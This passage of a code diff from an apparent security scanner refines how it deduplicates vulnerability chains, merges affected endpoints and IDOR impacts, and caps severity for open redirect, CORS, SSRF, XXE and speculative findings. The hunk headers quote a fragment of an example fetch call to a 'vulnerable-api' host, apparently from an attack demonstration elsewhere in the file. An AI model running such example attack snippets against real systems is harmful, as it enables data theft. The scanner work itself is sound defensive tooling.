+            "max_severity": "MEDIUM",
+            "reason": "DOM XSS + redirect is phishing enabler, not direct exploitation",
+        },
+        # Single-vuln chains with limited impact
         {
             "vulns": {"open_redirect"},
             "max_severity": "LOW",
-            "reason": "Open redirect alone has limited impact",
+            "reason": "Open redirect alone has limited impact without OAuth/phishing context",
         },
         {
             "vulns": {"information_disclosure"},
             "max_severity": "LOW",
-            "reason": "Info disclosure needs exploitation path",
+            "reason": "Info disclosure needs exploitation path to be actionable",
+        },
+        {
+            "vulns": {"clickjacking"},
+            "max_severity": "LOW",
+            "reason": "Clickjacking alone needs UI redressing for meaningful impact",
+        },
+        {
+            "vulns": {"cors_misconfiguration"},
+            "conditions": ["no_credentials_reflected"],
+            "max_severity": "MEDIUM",
+            "reason": "CORS without credentials reflection has limited exploitation value",
+        },
+        # Speculative chains (not yet proven)
+        {
+            "vulns": {"speculative"},
+            "max_severity": "MEDIUM",
+            "reason": "Speculative chains need validation before HIGH/CRITICAL rating",
+        },
+        # Chains that need specific conditions
+        {
+            "vulns": {"ssrf"},
+            "conditions": ["no_cloud_metadata", "no_internal_access"],
+            "max_severity": "MEDIUM",
+            "reason": "SSRF without cloud/internal access is limited to recon",
+        },
+        {
+            "vulns": {"xxe"},
+            "conditions": ["no_file_read", "no_ssrf"],
+            "max_severity": "MEDIUM",
+            "reason": "XXE without file read or SSRF is limited to DoS/fingerprinting",
+        },
+        # Header-based chains
+        {
+            "vulns": {"header_injection", "crlf"},
+            "max_severity": "MEDIUM",
+            "reason": "Header injection needs cache poisoning or XSS context for impact",
+        },
+        # Rate limit bypass alone
+        {
+            "vulns": {"rate_limit_bypass"},
+            "max_severity": "LOW",
+            "reason": "Rate limit bypass enables other attacks but isn't impactful alone",
         },
     ]
 
@@ -3361,10 +5369,53 @@ fetch('https://vulnerable-api.com/user/data', {
                 if isinstance(new_conf, str):
                     new_conf = {"HIGH": 0.9, "MEDIUM": 0.7, "LOW": 0.5}.get(new_conf.upper(), 0.5)
 
+                # FIX 2026-02-16: Consolidate affected endpoints instead of replacing
+                new_endpoint = chain.get("url", chain.get("matched_at", ""))
+                if new_endpoint:
+                    affected = existing.get("affected_endpoints", [])
+                    existing_endpoint = existing.get("url", existing.get("matched_at", ""))
+                    if existing_endpoint and existing_endpoint not in affected:
+                        affected.append(existing_endpoint)
+                    if new_endpoint not in affected:
+                        affected.append(new_endpoint)
+                    existing["affected_endpoints"] = affected
+
+                    # Update evidence to show consolidated info
+                    if len(affected) > 1:
+                        existing["evidence"] = existing.get("evidence", "") + f"\n\n[Consolidated: {len(affected)} affected endpoints]"
+
+                # FIX 2026-02-16: Consolidate IDOR impact types
+                new_chain_type = chain.get("type", "")
+                if "idor" in new_chain_type.lower():
+                    impact_types = existing.get("consolidated_impacts", [])
+                    existing_type = existing.get("type", "")
+                    if existing_type and existing_type not in impact_types:
+                        impact_types.append(existing_type)
+                    if new_chain_type not in impact_types:
+                        impact_types.append(new_chain_type)
+                    existing["consolidated_impacts"] = impact_types
+
+                    # Update name to reflect consolidated impacts
+                    if len(impact_types) > 1:
+                        impact_names = []
+                        for it in impact_types:
+                            if "vertical" in it.lower():
+                                impact_names.append("Vertical")
+                            elif "horizontal" in it.lower():
+                                impact_names.append("Horizontal")
+                            elif "enum" in it.lower():
+                                impact_names.append("Enumeration")
+                        if impact_names:
+                            existing["name"] = f"IDOR → {'/'.join(impact_names)} Access"
+
                 if new_conf > existing_conf:
-                    # Replace with higher confidence chain
-                    idx = unique_chains.index(existing)
-                    unique_chains[idx] = chain
+                    # Replace with higher confidence chain but keep affected_endpoints
+                    affected_eps = existing.get("affected_endpoints", [])
+                    for idx, ch in enumerate(unique_chains):
+                        if id(ch) == id(existing):
+                            chain["affected_endpoints"] = affected_eps
+                            unique_chains[idx] = chain
+                            break
                     seen_signatures[signature] = chain
             else:
                 seen_signatures[signature] = chain
@@ -3403,21 +5454,40 @@ fetch('https://vulnerable-api.com/user/data', {
                 normalized_vulns.append("authbypass")
             elif "priv" in v and ("esc" in v or "elev" in v):
                 normalized_vulns.append("privesc")
+            # FIX 2026-02-16: Consolidate IDOR chain variations
+            # idor_enumeration_chain, idor_horizontal_chain, idor_vertical_chain → "idor"
+            elif "idor" in v or "bola" in v:
+                normalized_vulns.append("idor")
             else:
                 normalized_vulns.append(v)
 
         # Sort for consistent ordering
         normalized_vulns = sorted(set(normalized_vulns))
 
-        # Include endpoint if available
-        endpoint = chain.get("url", chain.get("matched_at", ""))
-        if endpoint:
-            parsed = urlparse(endpoint)
-            endpoint_key = parsed.path[:50]  # First 50 chars of path
-        else:
-            endpoint_key = ""
+        # FIX 2026-02-16: Don't include endpoint in signature for chain deduplication
+        # Same chain type (e.g., "XSS → Token Theft") at different endpoints should be ONE finding
+        # The endpoint is stored in affected_endpoints list instead
 
-        return f"{'-'.join(normalized_vulns)}:{endpoint_key}"
+        # Only include endpoint for chains that are truly endpoint-specific
+        # (e.g., IDOR at specific resource vs generic XSS chain)
+        chain_name = chain.get("name", "").lower()
+
+        # IDOR chains ARE endpoint-specific (different resources)
+        # But XSS → Account Takeover chains are pattern-based (consolidate)
+        endpoint_specific_patterns = ["idor", "access control", "authorization", "bola"]
+        is_endpoint_specific = any(p in chain_name for p in endpoint_specific_patterns)
+
+        if is_endpoint_specific:
+            endpoint = chain.get("url", chain.get("matched_at", ""))
+            if endpoint:
+                parsed = urlparse(endpoint)
+                endpoint_key = parsed.path[:50]
+            else:
+                endpoint_key = ""
+            return f"{'-'.join(normalized_vulns)}:{endpoint_key}"
+        else:
+            # Generic chain pattern - consolidate across endpoints
+            return f"{'-'.join(normalized_vulns)}:*"
 
     def _validate_chain_context(
         self,
@@ -3513,11 +5583,40 @@ fetch('https://vulnerable-api.com/user/data', {
                     logger.debug(f"Chain downgraded: {current_severity} → {max_severity} ({pattern.get('reason')})")
                     break
 
-        # Mark speculative chains appropriately
-        if chain.get("is_speculative") and current_severity in ["CRITICAL", "HIGH"]:
-            if not chain.get("verified", False):
-                chain["severity"] = "MEDIUM"
-                chain["severity_reason"] = "Speculative chain (not verified)"
+        # H3 FIX 2026-02-12: Mark speculative chains appropriately with audit logging
+        is_speculative = chain.get("is_speculative", False)
+        is_verified = chain.get("verified", False)
+
+        # Detect speculative chains from metadata
+        metadata = chain.get("metadata", {})
+        if metadata.get("chain_type", "").startswith("speculative"):
+            is_speculative = True
+        if metadata.get("is_speculative"):
+            is_speculative = True
+
+        if is_speculative:
+            chain["is_speculative"] = True  # Ensure flag is set
+
+            if not is_verified:
+                # Downgrade severity for unverified speculative chains
+                if current_severity in ["CRITICAL", "HIGH"]:
+                    chain["severity"] = "MEDIUM"
+                    chain["severity_reason"] = "Speculative chain (not verified)"
+                    logger.info(
+                        f"[AUDIT][CHAIN] Speculative chain downgraded: "
+                        f"{current_severity} → MEDIUM (unverified)"
+                    )
+
+                # H3 FIX: Also cap confidence for speculative chains
+                current_confidence = chain.get("confidence", 80)
+                if isinstance(current_confidence, (int, float)) and current_confidence > 65:
+                    chain["confidence"] = 65
+                    chain["confidence_reason"] = "Capped for speculative chain"
+
+                # Add disclaimer to description
+                if "description" in chain:
+                    if "SPECULATIVE" not in chain["description"].upper():
+                        chain["description"] = f"[SPECULATIVE] {chain['description']}"
 
         return chain
 
